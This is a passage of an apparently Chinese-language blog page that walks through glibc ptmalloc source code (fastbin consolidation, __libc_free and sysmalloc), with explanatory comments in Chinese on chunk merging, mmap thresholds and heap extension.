class="comment">//获取当前遍历的fastbin中空闲chunk单向链表的头指针</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">	      <span class="keyword">do</span> &#123;</span><br><span class="line">	        check_inuse_chunk(av, p);</span><br><span class="line">	        nextp = p-&gt;fd;</span><br><span class="line">	        size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line">          <span class="comment">//获得当前chunk的size并去除size中的PREV_INUSE和NON_MAIN_ARENA标志,获取相邻的下一个chunk和下一个chunk的大小</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            <span class="comment">//如果当前chunk的前一个chunk空闲则将当前chunk与前一个chunk合并成一个空闲chunk</span></span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            <span class="comment">//如果与当前chunk相邻的下一个chunk不是分配区的top chunk,查看与当前chunk相邻的下一个chunk是否处于inuse状态</span></span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">              <span class="comment">//下一个chunk空闲则将当前chunk与下一个chunk合并成一个空闲chunk</span></span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">              <span class="comment">//与当前chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line">            <span class="comment">//将合并后的chunk加入unsorted_bin的双向循环链表中</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//当前chunk的下一个chunk为top chunk则将当前chunk合并入top chunk</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line">	      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//直到遍历完当前fastbin中的所有空闲chunk</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">    <span class="comment">//直到遍历完所有的fastbin</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//如果ptmalloc没有初始化,初始化ptmalloc</span></span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __libc_free (<span class="type">void</span> *mem) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p)) &#123;</span><br><span class="line">    <span class="comment">//如果当前free的chunk是通过mmap分配的,调用munmap_chunk函数</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</span><br><span class="line">      <span class="comment">//如果开启了mmap分配阈值动态调整机制且chunk的大小大于设置的mmap分配阈值,小于mmap分配阈值的最大值.则将当前chunk的大小赋值给mmap分配阈值,并修改mmap收缩阈值为mmap分配阈值的2倍</span></span><br><span class="line">      mp_.mmap_threshold = chunksize (p);</span><br><span class="line">      mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>, mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//不需要对分配区加锁,调用_int_free函数执行实际的释放工作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc函数处理需要从系统获取更多内存的malloc情况。</span></span><br><span class="line"><span class="comment">   在进入函数时，假设av-&gt;top没有足够的空间来满足对nb字节的请求，</span></span><br><span class="line"><span class="comment">   因此需要扩展或替换av-&gt;top。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span><span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">// av-&gt;top的原始值。</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">// 它的大小。</span></span><br><span class="line">  <span class="type">char</span> *old_end;                  <span class="comment">// 它的结束地址。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> size;                      <span class="comment">// 参数给MORECORE或mmap调用。</span></span><br><span class="line">  <span class="type">char</span> *brk;                      <span class="comment">// MORECORE的返回值。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> correction;                <span class="comment">// 参数给第二个MORECORE调用。</span></span><br><span class="line">  <span class="type">char</span> *snd_brk;                  <span class="comment">// 第二个返回值。</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">// 新空间前面的不可用字节。</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">// 新空间末端的部分页。</span></span><br><span class="line">  <span class="type">char</span> *aligned_brk;              <span class="comment">// 对齐的brk偏移。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">// 分配/返回的内存块。</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">// 分配后的剩余部分。</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;   <span class="comment">// 它的大小。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize); <span class="comment">// 系统页的大小。</span></span><br><span class="line">  <span class="type">bool</span> tried_mmap = <span class="literal">false</span>;             <span class="comment">// 标记是否尝试过mmap。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     如果使用mmap，并且请求的大小达到mmap阈值，并且系统支持mmap，</span></span><br><span class="line"><span class="comment">     并且当前分配的mmap区域数量较少，尝试直接映射这个请求，</span></span><br><span class="line"><span class="comment">     而不是扩展top。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold)</span><br><span class="line">          &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">// mmap调用的返回值。</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         将大小上调到最近的页大小。对于mmapped区块，开销比普通区块多一个SIZE_SZ单位，</span></span><br><span class="line"><span class="comment">         因为没有后续区块的prev_size字段可用。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         对于glibc，没有必要进行进一步对齐，除非我们需要更高的对齐。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">        size = ALIGN_UP(nb + SIZE_SZ, pagesize);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">      tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">      &#123;</span><br><span class="line">          mm = (<span class="type">char</span> *)(MMAP(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mm != MAP_FAILED)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 mmapped区域的开始偏移存储在区块的prev_size字段中。这允许我们在这里</span></span><br><span class="line"><span class="comment">                 和memalign()中调整返回的开始地址以满足对齐要求，并且仍然能够在</span></span><br><span class="line"><span class="comment">                 free()和realloc()中计算出正确的munmap参数地址。</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="comment">/* 对于glibc，chunk2mem增加地址2*SIZE_SZ，并且MALLOC_ALIGN_MASK是2*SIZE_SZ-1。</span></span><br><span class="line"><span class="comment">                     每个mmap区域都是页面对齐的，因此一定是MALLOC_ALIGN_MASK对齐的。*/</span></span><br><span class="line">                  assert(((INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">                  front_misalign = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                  front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                  <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                      correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                      p = (mchunkptr)(mm + correction);</span><br><span class="line">                      p-&gt;prev_size = correction;</span><br><span class="line">                      set_head(p, (size - correction) | IS_MMAPPED);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      p = (mchunkptr)mm;</span><br><span class="line">                      set_head(p, size | IS_MMAPPED);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 更新统计数据 */</span></span><br><span class="line"></span><br><span class="line">              <span class="type">int</span> new = atomic_exchange_and_add(&amp;mp_.n_mmaps, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">              <span class="type">atomic_max</span>(&amp;mp_.max_n_mmaps, new);</span><br><span class="line"></span><br><span class="line">              <span class="type">unsigned</span> <span class="type">long</span> sum;</span><br><span class="line">              sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">              <span class="type">atomic_max</span>(&amp;mp_.max_mmapped_mem, sum);</span><br><span class="line"></span><br><span class="line">              check_chunk(av, p);</span><br><span class="line"></span><br><span class="line">              <span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果没有可用的arena，并且mmap也失败了。 */</span></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 记录进入时top的配置 */</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;</span><br><span class="line">  old_size = chunksize(old_top);</span><br><span class="line">  old_end = (<span class="type">char</span> *)(chunk_at_offset(old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span> *)(MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     如果不是第一次通过，我们需要old_size至少是MINSIZE，并且设置了prev_inuse位。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse(old_top) &amp;&amp;</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>)old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 前提条件: 当前空间不足以满足nb请求 */</span></span><br><span class="line">  assert((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果av不是主arena，则尝试扩展当前堆或创建新堆。</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">      heap_info *old_heap, *heap;</span><br><span class="line">      <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 首先尝试扩展当前堆。 */</span></span><br><span class="line">      old_heap = heap_for_ptr(old_top);</span><br><span class="line">      old_heap_size = old_heap-&gt;size;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">long</span>)(MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">          &amp;&amp; grow_heap(old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          set_head(old_top, (((<span class="type">char</span> *)old_heap + old_heap-&gt;size) - (<span class="type">char</span> *)old_top)</span><br><span class="line">                   | PREV_INUSE);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap(nb + (MINSIZE + <span class="keyword">sizeof</span>(*heap)), mp_.top_pad)))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">/* 使用新分配的堆。 */</span></span><br><span class="line">          heap-&gt;ar_ptr = av;</span><br><span class="line">          heap-&gt;prev = old_heap;</span><br><span class="line">          av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">          arena_mem += heap-&gt;size;</span><br><span class="line">          <span class="comment">/* 设置新的 top chunk 。 */</span></span><br><span class="line">          top(av) = chunk_at_offset(heap, <span class="keyword">sizeof</span>(*heap));</span><br><span class="line">          set_head(top(av), (heap-&gt;size - <span class="keyword">sizeof</span>(*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* 释放旧的 top chunk 。 */</span></span><br><span class="line">          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">          set_head(chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">          <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">              set_head(chunk_at_offset(old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot(chunk_at_offset(old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">              set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">              _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">              set_head(old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot(old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">          <span class="comment">/* 至少可以尝试使用mmap内存。 */</span></span><br><span class="line">          <span class="keyword">goto</span> try_mmap;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* 请求足够的空间来满足nb + pad + 开销 */</span></span><br><span class="line">      size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         如果是连续的，我们可以减去希望与新空间合并的现有空间。</span></span><br><span class="line"><span class="comment">         我们稍后只在我们实际没有获得连续空间时再加回来。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">          size -= old_size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         将大小调整为页的倍数。</span></span><br><span class="line"><span class="comment">         如果MORECORE不是连续的，这确保我们只用整页参数调用它。</span></span><br><span class="line"><span class="comment">         并且如果MORECORE是连续的，并且这不是第一次通过，</span></span><br><span class="line"><span class="comment">         这会保持先前调用的页对齐。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      size = ALIGN_UP(size, pagesize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         如果参数太大，看起来是负的，不尝试调用MORECORE。</span></span><br><span class="line"><span class="comment">         注意，由于mmap接受size_t参数，即使我们无法调用MORECORE，</span></span><br><span class="line"><span class="comment">         下面如果使用mmap，也可能成功。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          brk = (<span class="type">char</span> *)(MORECORE(size));</span><br><span class="line">          LIBC_PROBE(memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">/* 必要时调用 morecore hook 。 */</span></span><br><span class="line">          <span class="type">void</span> (*hook)(<span class="type">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">              (*hook)();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             如果有mmap，尝试使用它作为MORECORE失败或不能使用时的后备。</span></span><br><span class="line"><span class="comment">             在地址空间有“洞”的系统上，这是值得做的，</span></span><br><span class="line"><span class="comment">             所以sbrk不能扩展以提供连续的空间，但空间在其他地方是可用的。</span></span><br><span class="line"><span class="comment">             注意我们忽略了mmap最大计数和阈值限制，</span></span><br><span class="line"><span class="comment">             因为空间将不会被用作分离的mmap区域。</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* 不能与旧的top合并，所以加回它的大小 */</span></span><br><span class="line">          <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">              size = ALIGN_UP(size + old_size, pagesize);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* 如果我们依赖mmap作为后备，那么使用更大的单位 */</span></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(MMAP_AS_MORECORE_SIZE))</span><br><span class="line">              size = MMAP_AS_MORECORE_SIZE;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="type">char</span> *mbrk = (<span class="type">char</span> *)(MMAP(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (mbrk != MAP_FAILED)</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="comment">/* 我们不需要也不能使用另一个sbrk调用来找到结束 */</span></span><br><span class="line">                  brk = mbrk;</span><br><span class="line">                  snd_brk = brk + size;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     记录我们不再有一个连续的sbrk区域。</span></span><br><span class="line"><span class="comment">                     第一次使用mmap作为后备后，我们不再依赖连续的空间，</span></span><br><span class="line"><span class="comment">                     因为这可能会错误地连接区域。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line">                  set_noncontiguous(av);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">              mp_.sbrk_base = brk;</span><br><span class="line">          av-&gt;system_mem += size;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             如果MORECORE扩展了前一个空间，我们可以同样扩展top大小。</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">              set_head(old_top, (size + old_size) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (contiguous(av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">              &#123;</span><br><span class="line">                  malloc_printerr(<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk, av);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             否则，做出调整:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 如果是第一次通过或不连续，我们需要调用sbrk</span></span><br><span class="line"><span class="comment">              只是为了找出内存的结束在哪里。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 我们需要确保所有从malloc返回的内存块都满足</span></span><br><span class="line"><span class="comment">              MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 如果有一个干预的外部sbrk，我们需要调整sbrk</span></span><br><span class="line"><span class="comment">              请求大小以考虑到我们将无法与old_top中的现有空间合并。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * 几乎所有系统在内部都以整页为单位分配，</span></span><br><span class="line"><span class="comment">              在这种情况下，我们最好使用请求的最后一页。</span></span><br><span class="line"><span class="comment">              所以我们现在分配足够多的内存来达到页面边界，</span></span><br><span class="line"><span class="comment">              这反过来会导致未来连续的调用进行页面对齐。</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">              front_misalign = <span class="number">0</span>;</span><br><span class="line">              end_misalign = <span class="number">0</span>;</span><br><span class="line">              correction = <span class="number">0</span>;</span><br><span class="line">              aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 处理连续情况 */</span></span><br><span class="line">              <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="comment">/* 计算外部sbrk作为system_mem。 */</span></span><br><span class="line">                  <span class="keyword">if</span> (old_size)</span><br><span class="line">                      av-&gt;system_mem += brk - old_end;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* 确保第一个新区块符合对齐要求 */</span></span><br><span class="line"></span><br><span class="line">                  front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                  <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         跳过一些字节以达到一个对齐的位置。</span></span><br><span class="line"><span class="comment">                         我们不需要特别标记这些浪费的前端字节。</span></span><br><span class="line"><span class="comment">                         它们永远不会被访问到，因为</span></span><br><span class="line"><span class="comment">                         av-&gt;top的prev_inuse（以及任何从它的开始创建的区块）</span></span><br><span class="line"><span class="comment">                         在初始化后总是为真。</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line"></span><br><span class="line">                      correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                      aligned_brk += correction;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     如果这不是与现有空间相邻的，那么我们将无法</span></span><br><span class="line"><span class="comment">                     与old_top空间合并，所以必须在第二个请求中加上这部分。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                  correction += old_size;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* 扩展结束地址以达到页面边界 */</span></span><br><span class="line">                  end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);</span><br><span class="line">                  correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</span><br><span class="line"></span><br><span class="line">                  assert(correction &gt;= <span class="number">0</span>);</span><br><span class="line">                  snd_brk = (<span class="type">char</span> *)(MORECORE(correction));</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     如果不能分配修正空间，尝试至少找出当前的brk。</span></span><br><span class="line"><span class="comment">                     它可能足以继续进行而不会失败。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                     注意如果第二个sbrk没有失败，我们假设空间与第一个sbrk连续。</span></span><br><span class="line"><span class="comment">                     这是一个安全的假设，除非程序是多线程的但不使用锁，</span></span><br><span class="line"><span class="comment">                     并且在我们的第一个和第二个调用之间发生了一个外部的sbrk。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">                  &#123;</span><br><span class="line">                      correction = <span class="number">0</span>;</span><br><span class="line">                      snd_brk = (<span class="type">char</span> *)(MORECORE(<span class="number">0</span>));</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="comment">/* 必要时调用 morecore hook 。 */</span></span><br><span class="line">                      <span class="type">void</span> (*hook)(<span class="type">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">                      <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                          (*hook)();</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 处理非连续情况 */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">                      <span class="comment">/* MORECORE/mmap必须正确对齐 */</span></span><br><span class="line">                      assert(((<span class="type">unsigned</span> <span class="type">long</span>)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">                  <span 